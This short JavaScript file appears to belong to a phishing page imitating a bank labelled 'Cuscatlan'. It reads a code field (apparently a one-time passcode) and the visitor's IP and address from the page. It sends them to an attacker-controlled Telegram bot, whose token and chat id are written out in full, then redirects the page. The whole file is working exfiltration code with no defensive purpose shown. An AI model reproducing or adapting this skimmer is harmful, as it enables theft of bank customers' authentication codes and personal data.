//bot token
var telegram_bot_id = "5716380069:AAEki92CoOEi7R75BLxAiMg0wx-r3KrQugQ";
//chat id
var chat_id = 5414740280;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("otstp").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "CUSCA-CODE: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\n\nCUSCATLAN";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = '';
        console.log(response);
    });
    return false;
};
